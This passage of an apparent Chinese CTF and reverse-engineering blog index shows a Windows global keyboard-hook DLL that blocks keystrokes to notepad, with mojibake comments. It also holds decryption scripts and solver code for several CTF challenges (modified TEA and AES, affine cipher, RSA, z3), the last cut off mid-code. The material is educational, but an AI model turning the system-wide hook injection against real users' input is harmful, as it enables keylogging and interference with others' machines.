LoadLibraryA(DEF_DLL_NAME); if( hDll == NULL ) &#123; printf(&quot;LoadLibrary(%s) failed!!! [%d]&quot;, DEF_DLL_NAME, GetLastError()); return; &#125; // export 窃荐 林家 掘扁 HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART); HookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP); // 饶欧 矫累 HookStart(); // 荤侩磊啊 &#x27;q&#x27; 甫 涝仿且 锭鳖瘤 措扁 printf(&quot;press &#x27;q&#x27; to quit!\\n&quot;); while( _getch() != &#x27;q&#x27; ) ; // 饶欧 辆丰 HookStop(); // KeyHook.dll 攫肺爹 FreeLibrary(hDll);&#125; dll代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include &quot;stdio.h&quot;#include &quot;windows.h&quot;#define DEF_PROCESS_NAME &quot;notepad.exe&quot;HINSTANCE g_hInstance = NULL;HHOOK g_hHook = NULL;HWND g_hWnd = NULL;BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)&#123; switch( dwReason ) &#123; case DLL_PROCESS_ATTACH: g_hInstance = hinstDLL; break; case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125;LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)&#123; char szPath[MAX_PATH] = &#123;0,&#125;; char *p = NULL; if( nCode &gt;= 0 ) &#123; // bit 31 : 0 =&gt; press, 1 =&gt; release if( !(lParam &amp; 0x80000000) ) &#123; GetModuleFileNameA(NULL, szPath, MAX_PATH); p = strrchr(szPath, &#x27;\\\\&#x27;); // 泅犁 橇肺技胶 捞抚阑 厚背秦辑 父距 notepad.exe 扼搁 0 酒囱 蔼阑 府畔窃 // =&gt; 0 酒囱 蔼阑 府畔窍搁 皋矫瘤绰 促澜栏肺 傈崔登瘤 臼澜 if( !_stricmp(p + 1, DEF_PROCESS_NAME) ) return 1; &#125; &#125; // 老馆利牢 版快俊绰 CallNextHookEx() 甫 龋免窍咯 // 览侩橇肺弊伐 (趣篮 促澜 扰) 栏肺 皋矫瘤甫 傈崔窃 return CallNextHookEx(g_hHook, nCode, wParam, lParam);&#125;#ifdef __cplusplusextern &quot;C&quot; &#123;#endif __declspec(dllexport) void HookStart() &#123; g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0); &#125; __declspec(dllexport) void HookStop() &#123; if( g_hHook ) &#123; UnhookWindowsHookEx(g_hHook); g_hHook = NULL; &#125; &#125;#ifdef __cplusplus&#125;#endif 调试hook用字符串搜索直接定位到main函数 上面得到hookStart地址，然后call，F7直接步入就能进入hookstart函数 这里就是dll中注册键盘hook 直接根据注册时得到的地址进行跳转就能得到hook函数 也可以打开notepad，进行附加attach，先摁F9，让hook注册成功 然后在新加一个模块处停止，option设置 附加后在键盘输入字母，od会立马断住。","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"syc_level7","slug":"syc-level7","date":"2022-12-20T03:30:36.000Z","updated":"2022-12-20T04:11:42.019Z","comments":true,"path":"2022/12/20/syc-level7/","link":"","permalink":"https://pa1r0t.github.io/2022/12/20/syc-level7/","excerpt":"syc_level7 这种异常处理的catch代码一开始不会找，后来看了三叶草的战队的解答才知道怎么操作","text":"syc_level7 这种异常处理的catch代码一开始不会找，后来看了三叶草的战队的解答才知道怎么操作 这里有四个throw块，要找到对应catch代码，然后jmp过去就能看见源码，三叶草那边的解答是手撸汇编代码，说实话这种分析太慢，而且容易出错，还不如让ida来帮我们分析 转到卡片形式汇编代码，有这种标志的就是catch代码 然后将所有的catch块打上断点 然后在throw代码之前也都打上断点 然后，运行程序找到，各个throw对应的catch块 修改throw代码为jmp 对应catch地址，直接看到源码 这里随机数，大循环32次每一次要重置srand，小循环四次，所以只需要输出4个随机数即可 这里用c语言中的srand代码生成随机数，值得注意的是，&#x3D;&#x3D;我在windows上用c语言跑，跑出来的随机数根本不对。要在linux上面跑才行&#x3D;&#x3D; 这里根据随机数，标上代码块的执行顺序 最后python伪代码： 12345678910111213enc = [0xA3A7C060, 0xEE6E5485, 0x244B2655, 0x318482D9]delta = 0x9E3779B9for i in range(32): v11 += delta v12 += delta v7 += ((v8 &gt;&gt; 5) + 6) ^ (v8 + v11) ^ (16 * v8 + 8) ^ (i + v11) v9 += ((v10 &gt;&gt; 5) + 6) ^ (v10 + v12) ^ (16 * v10 + 8) ^ (i + v12) v8 += ((v7 &gt;&gt; 5) + 7) ^ (v7 + v11) ^ (16 * v7 + 9) ^ (i + v11) v10 += ((v9 &gt;&gt; 5) + 7) ^ (v9 + v12) ^ (16 * v9 + 9) ^ (i + v12)v19 = v7 ^ HIBYTE(delta)v20 = v8 ^ BYTE2(delta)v21 = v9 ^ BYTE1(delta)v22 = v10 ^ (unsigned __int8)delta 然后根据这个代码写出解密脚本： 1234567891011121314151617181920212223# lesson7from Crypto.Util.number import *enc = [0xA3A7C060, 0xEE6E5485, 0x244B2655, 0x318482D9]delta = 0x9E3779B9s = (delta*32)&amp;0xffffffffv7 = enc[0]^0x9ev8 = enc[1]^0x37v9 = enc[2]^0x79v10 = enc[3]^0xb9for i in range(31,-1,-1): v10 -= ((v9 &gt;&gt; 5) + 7) ^ (v9 + s) ^ (16 * v9 + 9) ^ (i + s) v10 = v10&amp;0xffffffff v8 -= ((v7 &gt;&gt; 5) + 7) ^ (v7 + s) ^ (16 * v7 + 9) ^ (i + s) v8 = v8&amp;0xffffffff v9 -= ((v10 &gt;&gt; 5) + 6) ^ (v10 + s) ^ (16 * v10 + 8) ^ (i + s) v9 = v9&amp;0xffffffff v7 -= ((v8 &gt;&gt; 5) + 6) ^ (v8 + s) ^ (16 * v8 + 8) ^ (i + s) v7 = v7&amp;0xffffffff s = (s-delta)&amp;0xffffffffenc = [v7,v8,v9,v10]flag = int(&#x27;&#x27;.join(map(lambda x: hex(x)[2:],enc)),16)long_to_bytes(flag)#SYC&#123;ediGegTEaEi&#125;","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"}],"tags":[]},{"title":"syc_level5","slug":"syc-level5","date":"2022-12-19T13:02:09.000Z","updated":"2022-12-19T13:11:09.681Z","comments":true,"path":"2022/12/19/syc-level5/","link":"","permalink":"https://pa1r0t.github.io/2022/12/19/syc-level5/","excerpt":"emmmmmmmmmmm,第一次做到魔改aes，有点激动记录一下吧","text":"emmmmmmmmmmm,第一次做到魔改aes，有点激动记录一下吧 魔改AES 这里做21次操作。但是无列混淆 第一次做这种魔改aes，逆着就是先行移位，原先怎么移动，就逆回去 然后再字节替换，也可以逆 然后再轮密钥加，这个要从后往前，不然会影响字节替换，字节替换是必须要有顺序的 最后就是每一个密文块的初始异或，该题除了第一块，其他都是拿密文块作为密匙 结果： 12345678910111213141516171819202122232425262728293031323334353637# lesson5def row_re(i): # 第二行 v1 = a1[13+i*16] a1[13+i*16] = a1[9+i*16] a1[9+i*16] = a1[5+i*16] a1[5+i*16] = a1[1+i*16] a1[1+i*16] = v1 # 第三行 不变 v2 = a1[2+i*16] a1[2+i*16] = a1[10+i*16] a1[10+i*16] = v2 v3 = a1[6+i*16] a1[6+i*16] = a1[14+i*16] a1[14+i*16] = v3 # 第四行 v4 = a1[15+i*16] a1[15+i*16] = a1[3+i*16] a1[3+i*16] = a1[7+i*16] a1[7+i*16] = a1[11+i*16] a1[11+i*16] = v4 a1 = [0xF8, 0x88, 0x9D, 0x31, 0xC7, 0x24, 0xD5, 0xF9, 0x45, 0x28, 0x9B, 0x7D, 0x42, 0x66, 0x65, 0x29, 0x2E, 0xC3, 0xC3, 0x5F, 0x1E, 0x1C, 0x43, 0xE9, 0x1E, 0xE1, 0xB9, 0xBD, 0x85, 0x5B, 0x7A, 0x39, 0xDE, 0xF6, 0xA7, 0xB8, 0xF5, 0xD2, 0xF9, 0xFE, 0xD9, 0xA0, 0x13, 0xF3, 0x43, 0xEF, 0xB2, 0x8A]key_t = [0x58, 0x2F, 0x36, 0xDD, 0x92, 0xF2, 0x79, 0x09, 0xC8, 0x73, 0x6F, 0x0A, 0x36, 0x14, 0x6F, 0x43, 0xB7, 0x1A, 0x21, 0xD0, 0x25, 0xE8, 0x58, 0xD9, 0xED, 0x9B, 0x37, 0xD3, 0xDB, 0x8F, 0x58, 0x90, 0x55, 0x7D, 0x4C, 0x5C, 0x70, 0x95, 0x14, 0x85, 0x9D, 0x0E, 0x23, 0x56, 0x46, 0x81, 0x7B, 0xC6, 0x6C, 0xF6, 0x8D, 0x4F, 0x1C, 0x63, 0x99, 0xCA, 0x81, 0x6D, 0xBA, 0x9C, 0xC7, 0xEC, 0xC1, 0x5A, 0xA5, 0x79, 0x86, 0x50, 0xB9, 0x1A, 0x1F, 0x9A, 0x38, 0x77, 0xA5, 0x06, 0xFF, 0x9B, 0x64, 0x5C, 0x10, 0xBF, 0x28, 0x66, 0xA9, 0xA5, 0x37, 0xFC, 0x91, 0xD2, 0x92, 0xFA, 0x6E, 0x49, 0xF6, 0xA6, 0x42, 0xD6, 0x3C, 0x5E, 0xEB, 0x73, 0x0B, 0xA2, 0x7A, 0xA1, 0x99, 0x58, 0x14, 0xE8, 0x6F, 0xFE, 0x1D, 0xE3, 0x3A, 0xB3, 0xF6, 0x90, 0x31, 0x11, 0x8C, 0x31, 0xA8, 0x49, 0x98, 0xD9, 0xC7, 0xB7, 0x66, 0xFC, 0xE2, 0x77, 0x90, 0x6C, 0xD3, 0x66, 0x1C, 0x5D, 0x7B, 0x2F, 0x84, 0x84, 0xBC, 0x98, 0x70, 0x64, 0x26, 0x57, 0xE0, 0x08, 0xF5, 0x31, 0xFC, 0x55, 0x8E, 0x1E, 0x78, 0xD1, 0x32, 0x86, 0x36, 0xC2, 0x96, 0xDE, 0xD6, 0xCA, 0x63, 0xEF, 0x2A, 0x9F, 0xED, 0xF1, 0x52, 0x4E, 0xDF, 0x77, 0x63, 0xB1, 0xF2, 0x20, 0xB5, 0x7B, 0x91, 0xCF, 0x9F, 0xE4, 0x7C, 0x3E, 0xCD, 0xAA, 0xA3, 0x49, 0xF2, 0xD7, 0xE0, 0x5F, 0x47, 0xAC, 0x71, 0x90, 0xD8, 0x48, 0x0D, 0xAE, 0x15, 0xE2, 0xAE, 0xE7, 0xD5, 0xCC, 0x29, 0x03, 0x92, 0x60, 0x58, 0x93, 0x4A, 0x28, 0x55, 0x3D, 0x5F, 0xCA, 0xFB, 0xDA, 0x79, 0xCF, 0xD9, 0x07, 0xEB, 0xAF, 0x81, 0x94, 0xA1, 0x87, 0xD4, 0xA9, 0xFE, 0x4D, 0x2F, 0x73, 0x56, 0x36, 0xE5, 0x01, 0xBD, 0x99, 0x64, 0x95, 0x1C, 0x1E, 0xB0, 0x3C, 0xE2, 0x53, 0x9F, 0x4F, 0x13, 0x2E, 0x2F, 0x26, 0xAE, 0xB7, 0x4B, 0xB3, 0xB2, 0xA9, 0xFB, 0x8F, 0x50, 0xFA, 0x64, 0xC0, 0x85, 0xE8, 0x33, 0x8D, 0x2B, 0x5F, 0x78, 0x3E, 0x99, 0xF6, 0x83, 0xB1, 0xC9, 0x0C, 0xE7, 0x71, 0x04, 0x21, 0x0D, 0x43, 0x2F, 0x7E, 0x75, 0x7D, 0xB6, 0x88, 0xF6, 0xCC, 0x7F, 0x84, 0x11, 0xBD, 0x24, 0x6F, 0x4F, 0xD7, 0x0B, 0x11, 0x3A, 0xAA, 0xBD, 0x99, 0xCC, 0x66, 0xC2, 0x1D, 0xDD, 0xDB, 0x69, 0xAF, 0xC3, 0x88, 0x62, 0xBE, 0xF9, 0x22, 0xDF, 0x27, 0x35, 0x44, 0x1D, 0x3A, 0xE8, 0x9F, 0x61, 0x70, 0xDB, 0xC5, 0x03, 0xCE, 0x22, 0xE7, 0xDC, 0xE9, 0x17, 0xA3, 0xC1, 0xD3, 0xFF, 0x3C, 0x02]SBOX = [0x28, 0x90, 0xC3, 0x41, 0xC2, 0x75, 0x84, 0xDA, 0x79, 0xE7, 0x21, 0x0C, 0x81, 0xD5, 0xBF, 0x92, 0xB8, 0x4E, 0xB1, 0x2D, 0xED, 0x5C, 0xCB, 0x99, 0x6A, 0x32, 0x6F, 0xF2, 0x52, 0x4D, 0x29, 0x77, 0x49, 0x1D, 0xBB, 0x3A, 0x9F, 0x02, 0x1A, 0x71, 0x58, 0x72, 0xBA, 0xA1, 0x5E, 0xFA, 0x48, 0xF9, 0xFC, 0xF7, 0xA6, 0x97, 0x9D, 0x24, 0x0D, 0xE0, 0xF3, 0x37, 0x08, 0xEA, 0xF5, 0x6B, 0x86, 0xEF, 0x8D, 0x61, 0x65, 0x17, 0xD7, 0x7E, 0x13, 0x9C, 0xCC, 0x12, 0x33, 0x8E, 0x7D, 0x2F, 0x55, 0xCA, 0xAB, 0xE4, 0xFE, 0x45, 0xD6, 0xF6, 0xDE, 0xF1, 0x67, 0xE1, 0x0B, 0xB2, 0xAE, 0xCF, 0x7C, 0x04, 0x0E, 0x16, 0xA2, 0x00, 0xC6, 0xFF, 0x2C, 0x1E, 0x47, 0x30, 0xA4, 0x40, 0x4B, 0x15, 0x38, 0x35, 0xAF, 0x3E, 0x39, 0x3C, 0xD2, 0x85, 0xC7, 0x64, 0x89, 0xFD, 0xE8, 0x8B, 0x43, 0xC8, 0x22, 0x94, 0xA8, 0x31, 0xA3, 0xB9, 0x20, 0xEB, 0xB0, 0x01, 0x3D, 0x68, 0x5A, 0x93, 0x5B, 0x4F, 0x50, 0xE6, 0x6D, 0xF4, 0x44, 0x10, 0x80, 0xA7, 0x51, 0xD3, 0xC4, 0x2B, 0x88, 0x95, 0xA5, 0x70, 0x23, 0x18, 0x09, 0x4A, 0x19, 0x66, 0xDC, 0xEC, 0x14, 0xA9, 0xDB, 0xE2, 0x91, 0x4C, 0x57, 0x82, 0x1B, 0x2A, 0x11, 0x7B, 0x5D, 0x8A, 0xD4, 0xA0, 0x07, 0xD8, 0x53, 0x9B, 0x26, 0xD1, 0x98, 0x42, 0x0A, 0x9A, 0x1C, 0x8F, 0x5F, 0x63, 0xE9, 0xCD, 0xC1, 0x1F, 0x6C, 0xCE, 0xAC, 0xAA, 0xD0, 0x7F, 0x59, 0xBE, 0xB6, 0x46, 0xB7, 0x83, 0xEE, 0x7A, 0x9E, 0xC5, 0x62, 0x60, 0xF0, 0x8C, 0x2E, 0xC0, 0xDD, 0x73, 0x56, 0x76, 0x27, 0xB5, 0x25, 0x74, 0x6E, 0xC9, 0xDF, 0xB4, 0x34, 0x05, 0xD9, 0xB3, 0xBD, 0x3B, 0x54, 0xAD, 0x0F, 0x87, 0x78, 0xFB, 0x69, 0xF8, 0xBC, 0xE3, 0x96, 0x03, 0x3F, 0xE5, 0x06, 0x36]key = [bytearray(b&quot;vMBixpswDVgJhpZd&quot;),[a1[i] for i in range(16)],[a1[i] for i in range(16,32)]]for i in range(3): for p in range(21,-1,-1): row_re(i) for j in range(i*16,(i+1)*16): a1[j] = SBOX.index(a1[j]) for k in range(16): a1[i*16+k] ^= key_t[p*16 + k] for l in range(16): a1[l+16*i] ^= key[i][l]bytearray(a1)# SYC&#123;ZtZJpWvEthTkaDzLQznEYLybEcNOPfmlukmZbzXBhih&#125;","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"}],"tags":[]},{"title":"re_base1","slug":"re-base1","date":"2022-12-17T13:16:25.000Z","updated":"2022-12-17T13:36:34.076Z","comments":true,"path":"2022/12/17/re-base1/","link":"","permalink":"https://pa1r0t.github.io/2022/12/17/re-base1/","excerpt":"re_OD debugger1","text":"re_OD debugger1 查找main函数的五种方法运行程序，看见弹窗，盲猜是user32.GetmessageW()的api 方法一： 1.不断地F7步入函数 2.看见一些红色api，即一些库函数，就Ctrl+F9跳出此函数 3.直到看见弹窗函数 方法二： 1.不断地F8步过函数 2.直到某个函数执行了弹窗函数，然后在此函数之上下断，然后ctrl+F2重新开始 3.直到找到弹窗函数 方法三： 1.通过查找api的方式查找main函数 2.右键查看模块间的调用函数 3.找到弹窗函数即可 方法四： 1.Ctrl+n查找所有内存的api 方法五： 1.查找字符串,右键即可 这里修改dump窗口的数据，选中数据后摁ctrl+E 修改后右键复制到文件 在dump窗口中，右键保存文件即可","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"信创网安wp","slug":"信创网安wp","date":"2022-12-05T02:42:19.000Z","updated":"2022-12-05T03:12:44.452Z","comments":true,"path":"2022/12/05/信创网安wp/","link":"","permalink":"https://pa1r0t.github.io/2022/12/05/%E4%BF%A1%E5%88%9B%E7%BD%91%E5%AE%89wp/","excerpt":"省排名：22 web师傅纠结于web最后一题，所以杂项一道没做。然后我把仿射密码的做题思路给忘了，然后密码0解，至于pwn….","text":"省排名：22 web师傅纠结于web最后一题，所以杂项一道没做。然后我把仿射密码的做题思路给忘了，然后密码0解，至于pwn…. RevShift123456789101112str1=&#x27;≁⧃⩆㷕⿤ᩣᡤ㋟㩨ᣳ⿃ᣰ㑥㥟⫴㍽&#x27;print(str1)for i in str1: t = ord(i)&amp;0xff if t &gt; 128: print(chr(ord(i) &gt;&gt; 7)+chr((ord(i)-128)&amp;0xff),end=&#x27;&#x27;) else: print(chr(ord(i) &gt;&gt; 7)+chr((ord(i))&amp;0xff),end=&#x27;&#x27;)f.close()print(int(&#x27;10000000&#x27;,2))# DASCTF&#123;U_d4c0de_th1s_C1pher_Utf&#125; ReContract1.智能合约的题，我也是第一次做，但提示说是一道容易题，查看文件发现前面有几个数字缺了，直接百度搜着找就行2.然后又找到一篇文章，上面写着一个在线工具3.直接将字节码复制进去翻译即可4.这里看见有五个可疑数字，拿去转字符串看看5.发现顺序是乱的，以我神级英语水平，大概的顺序就是:’反编译智能合约字节码真的不错’,hhhhhhhhhhhh12345678from Crypto.Util.number import *print(long_to_bytes(0x4279746563306465355f00000000000000000000000000000000000000000000))print(long_to_bytes(0x4441534354467b00000000000000000000000000000000000000000000000000))print(long_to_bytes(0x536d3472745f43306e74724063745f0000000000000000000000000000000000))print(long_to_bytes(0x443363306d70316c655f00000000000000000000000000000000000000000000))print(long_to_bytes(0x31735f46756e4e792e7d00000000000000000000000000000000000000000000))# DASCTF&#123;D3c0mp1le_Sm4rt_C0ntr@ct_Bytec0de5_1s_FunNy.&#125; 赛后复现密码—–逆向第三道懒得复现，还有密码第三道。。。。。。&#x3D;&#x3D;看了一遍代码就把文件扔到回收站了&#x3D;&#x3D; easy_Affline这道题题目给的a，b数字太大，我以为要爆破很长的区间，其实不用，经过我脚本的测试，发现大数字和小数字的结果是相同的，所以只需遍历0~m即可 1234567891011121314151617181920212223242526272829303132333435from Crypto.Util.number import *import randomtext = &#x27;aCdhpnlmNKuRJbfVIXUvyTrSPqjBMzgwHZkAxWGiYetEsocDLFOQ&#x27;cipher = &#x27;CezmBh&#123;BKDdD_oP_rKD_rdtF_cMHu&#125;&#x27;flag=&#x27;DASCTF&#x27;i = 0def d(): for a in range(2, 52): for b in range(2, 52): if GCD(a,52) == 1: break c = &#x27;&#x27; t = inverse(a,52) for i in cipher: x = text.find(i) c += text[t*(x-b) % len(text)] if c == flag: print(a,b) return d()a = 2b = 6t = inverse(a,52)flag = &#x27;&#x27;for i in cipher: if i not in text: flag += i else: x = text.find(i) flag += text[t*(x-b) % len(text)]print(flag)# DASCTF&#123;TheLe_iU_Ihe_ILxE_Yrjp&#125; gauss_systemsage解即可 12345678910111213k = 1751007263671615053487807501173970925758538c = 463982900309034681135307002234842926080979p, q = var(&quot;p, q&quot;)assume(p, &quot;integer&quot;)assume(q, &quot;integer&quot;)sol = solve((p - 1003) ** 2 + (q - 48) ** 2 == k, p, q)for p, q in sol: if p &gt; 0 and q &gt; 0: p, q = int(p), int(q) if is_prime(p) and is_prime(q): print(p) print(q) 12345678910111213141516import libnumimport gmpy2from Crypto.Util.number import *e = 0x10001s = 1751007263671615053487807501173970925758538c = 463982900309034681135307002234842926080979p = 1087638045546779918273q = 753691412682137267747assert p**2 + q**2 == sphi = (p-1)*(q-1)d = libnum.invmod(e,phi)n = p*qm = pow(c,d,n)long_to_bytes(m)# Z[i]_15_m4g1c","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"}],"tags":[]},{"title":"NOV X联合出题人","slug":"buuctf-nov","date":"2022-11-29T08:52:11.000Z","updated":"2022-11-30T09:27:57.484Z","comments":true,"path":"2022/11/29/buuctf-nov/","link":"","permalink":"https://pa1r0t.github.io/2022/11/29/buuctf-nov/","excerpt":"​ 比赛一直在打安洵杯，buu都没好好看，现在安洵杯迷宫题斜着走还没搞明白，先来复现一波buu的月赛","text":"​ 比赛一直在打安洵杯，buu都没好好看，现在安洵杯迷宫题斜着走还没搞明白，先来复现一波buu的月赛 babytea1. 一 看核心算法经典tea2. 结果脚本算不出来&#x3D;&#x3D;，我还以为老子脚本有问题，动调发现有异常，直接去看汇编，结果发现果然存在几个异常点a)sum+异常b)开头也有异常，而且这个是默认必须跳转3.直接修改汇编，让报错的地方直接跳转到异常处理程序4.然后源码就变了5.但是v5地方不是每次都要异或，是有条件的，当&gt;&gt;0x1f &#x3D;&#x3D; 0时异或6.总之这是一道魔改tea罢了，脚本如下123456789101112131415161718192021222324252627282930313233343536373839from Crypto.Util.number import *def tea(v,k,d38,d3c): v0 = v[0] v1 = v[1] s = 0 j = [0] # sum for i in range(32): s = (s + dword_41F000)&amp;0xffffffff if (s &gt;&gt; 0x1f) == 0: s ^= 0x1234567 j.append(s) sum = j[32] for i in range(32): v1 -= (k[3] + (v0 &gt;&gt; 5)) ^ (sum + v0) ^ (k[2] + 16 * v0) v1 = v1&amp;0xffffffff v0 -= (k[1] + (v1 &gt;&gt; 5)) ^ (sum + v1) ^ (k[0] + 16 * v1) v0 = v0&amp;0xffffffff sum = j[31-i] v0 ^= d38 v1 ^= d3c v[0] = v0&amp;0xffffffff v[1] = v1&amp;0xffffffffenc = [0x5E27B530, 0x0BDBEF7F3, 0x0E3516A8F, 0x5D836CFE, 0x0D83DFA09, 0x8EFC737A,0x55A853A3, 0x7A564EC5]k = [0x67452301, 0x0EFCDAB89, 0x98BADCFE, 0x10325476]m = [None]*2flag = []dword_41F038 = [0x1234567,0x5E27B530,0x0E3516A8F,0x0D83DFA09]dword_41F03C = [0x89ABCDEF,0x0BDBEF7F3,0x5D836CFE,0x8EFC737A]dword_41F000 = 0x9E3779B1for i in range(4): m[0] = enc[2*i] m[1] = enc[2*i+1] tea(m,k,dword_41F038[i],dword_41F03C[i]) flag.append(long_to_bytes(m[0])[::-1]) flag.append(long_to_bytes(m[1])[::-1])b&#x27;&#x27;.join(flag)#600d_y0u_r34lly_kn0w_734_4nd_53h babysmc1. smc函数，但是异或值是输入的值2. 其他也没有和输入值相关的函数，所以只能选择爆破3. 当爆破到第一个操作时push ebp时那就成功了，所以硬编码就为0x55，先是loc50，第一个值是574. 但是爆破失败，真的是糟糕！！！5. 后面发现还有一个函数，这个函数居然爆破成功了，奇了个怪6. 后面惊奇地发现第一个函数应该被异或了两次，进过256长度的计算，确实如此7. 然后就爆破出来了，yes，用idc改编码8. 改完之后从修改开始处到return代码全部重新分析一遍，因为256长度把已经分析了的代码也改了，然后重新生成函数9. 然后逻辑就是循环十次，不同函数调用十次，最后用z3解这里附上代码，仅供参考123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656from z3 import *dword_422040 = [0x00027FC8, 0x00029049, 0x0003336C, 0x0002C6A7, 0x00036CB0, 0x0001F2BB, 0x00035262, 0x0002AEDF, 0x0002955E, 0x0002EE10, 0x0002B057, 0x0002FDE8, 0x00029B92, 0x00035842, 0x000294D2, 0x0002B984]flag = [0] * 34s = Solver()a1 = [BitVec(f&#x27;flag[&#123;i&#125;]&#x27;,8) for i in range(17,33)]s.add(dword_422040[0] == (159 * a1[8] \\ + 109 * a1[12] \\ + 14 * a1[0] \\ + 92 * a1[14] \\ + 211 * a1[4] \\ + 178 * a1[7] \\ + 57 * a1[2] \\ + 175 * a1[5] \\ + 170 * a1[11] \\ + 59 * a1[6] \\ + 200 * a1[9] \\ + 5 * a1[15] \\ + 48 * a1[13] \\ + 28 * a1[3] \\ + 18 * a1[10] \\ + 228 * a1[1])&amp;0xffffffff)s.add(dword_422040[6] == (173 * a1[11] \\ + 34 * a1[5] \\ + 69 * a1[4] \\ + 216 * a1[14] \\ + 225 * a1[9] \\ + 160 * a1[1] \\ + 207 * a1[10] \\ + 175 * a1[7] \\ + 121 * a1[0] \\ + 122 * a1[2] \\ + 179 * a1[12] \\ + 91 * a1[13] \\ + 181 * a1[8] \\ + 93 * a1[3] \\ + 121 * a1[6] \\ + 12 * a1[15])&amp;0xffffffff)s.add(dword_422040[8] == (215 * a1[11] \\ + 164 * a1[5] \\ + 97 * a1[2] \\ + 99 * a1[3] \\ + 188 * a1[4] \\ + ((a1[9] &lt;&lt; 7)&amp;0xffffffff) \\ + 214 * a1[6] \\ + 106 * a1[8] \\ + 169 * a1[0] \\ + 28 * a1[14] \\ + 18 * a1[12] \\ + a1[1] \\ + 177 * a1[10] \\ + 114 * a1[7] \\ + 176 * a1[15] \\ + 25 * a1[13])&amp;0xffffffff)s.add(dword_422040[9] == (175 * a1[14] \\ + 42 * a1[4] \\ + 214 * a1[12] \\ + 43 * a1[13] \\ + 147 * a1[6] \\ + 53 * a1[10] \\ + 12 * a1[1] \\ + 213 * a1[7] \\ + 241 * a1[9] \\ + 223 * a1[5] \\ + 65 * a1[3] \\ + 42 * a1[15] \\ + 131 * a1[2] \\ + 81 * a1[0] \\ + 92 * a1[11] \\ + 110 * a1[8])&amp;0xffffffff)s.add(dword_422040[13] == (57 * a1[0] \\ + 109 * a1[7] \\ + 60 * a1[2] \\ + 228 * a1[13] \\ + 166 * a1[4] \\ + 236 * a1[9] \\ + 100 * a1[6] \\ + 179 * a1[11] \\ + 20 * a1[12] \\ + 45 * a1[8] \\ + 204 * a1[3] \\ + 182 * a1[14] \\ + 84 * a1[10] \\ + 170 * a1[15] \\ + 199 * a1[5] \\ + 138 * a1[1])&amp;0xffffffff)s.add(dword_422040[10] == (98 * a1[11] \\ + 122 * a1[9] \\ + 237 * a1[12] \\ + 117 * a1[0] \\ + 34 * a1[3] \\ + 168 * a1[8] \\ + 135 * a1[10] \\ + 119 * a1[6] \\ + 91 * a1[2] \\ + 161 * a1[15] \\ + 152 * a1[7] \\ + 186 * a1[4] \\ + 187 * a1[13] \\ + 72 * a1[14] \\ + 36 * a1[5] \\ + 171 * a1[1])&amp;0xffffffff)s.add(dword_422040[7] == (184 * a1[9] \\ + 112 * a1[0] \\ + 107 * a1[11] \\ + 170 * a1[13] \\ + 55 * a1[8] \\ + 85 * a1[14] \\ + 212 * a1[10] \\ + 173 * a1[15] \\ + 166 * a1[12] \\ + 142 * a1[4] \\ + 202 * a1[5] \\ + 63 * a1[2] \\ + 30 * a1[7] \\ + 175 * a1[3] \\ + 217 * a1[6] \\ + 63 * a1[1])&amp;0xffffffff)s.add(dword_422040[15] == (((a1[7] &lt;&lt; 6)&amp;0xffffffff) \\ + 228 * a1[4] \\ + 90 * a1[11] \\ + 85 * a1[3] \\ + 196 * a1[6] \\ + 219 * a1[0] \\ + 93 * a1[14] \\ + 183 * a1[15] \\ + 156 * a1[12] \\ + 197 * a1[8] \\ + 119 * a1[13] \\ + 36 * a1[10] \\ + 205 * a1[2] \\ + 94 * a1[9] \\ + 153 * a1[5])&amp;0xffffffff)s.add(dword_422040[5] == (9 * a1[4] \\ + ((a1[5] &lt;&lt; 6)&amp;0xffffffff) \\ + 62 * a1[1] \\ + 58 * a1[7] \\ + 100 * a1[13] \\ + 137 * a1[11] \\ + 6 * a1[0] \\ + 119 * a1[9] \\ + 180 * a1[6] \\ + 228 * a1[8] \\ + 88 * a1[12] \\ + 107 * a1[15] \\ + 56 * a1[14] \\ + 207 * a1[2] \\ + 248 * a1[10] \\ + 150 * a1[3])&amp;0xffffffff)s.add(dword_422040[3] == (38 * a1[7] \\ + 194 * a1[4] \\ + 105 * a1[0] \\ + 150 * a1[6] \\ + 75 * a1[1] \\ + 89 * a1[15] \\ + 99 * a1[14] \\ + 98 * a1[3] \\ + 91 * a1[8] \\ + 178 * a1[12] \\ + 117 * a1[2] \\ + 48 * a1[13] \\ + 239 * a1[10] \\ + 233 * a1[11] \\ + 63 * a1[5] \\ + 250 * a1[9])&amp;0xffffffff)s.add(dword_422040[11] == (30 